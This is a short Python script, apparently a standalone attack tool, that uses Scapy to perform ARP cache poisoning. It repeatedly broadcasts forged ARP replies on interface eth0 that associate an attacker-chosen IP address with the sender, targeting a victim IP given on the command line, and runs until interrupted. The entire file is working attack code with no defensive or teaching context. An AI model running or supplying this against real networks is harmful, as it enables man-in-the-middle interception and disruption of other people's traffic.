import sys
from scapy.all import *
import time

def arp_poison(victim_ip, fake_ip):
    
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=fake_ip, pdst=victim_ip)

    try:
        while True:
            sendp(packet, iface="eth0", verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Ctrl-c : end")

arp_poison(sys.argv[1], sys.argv[2])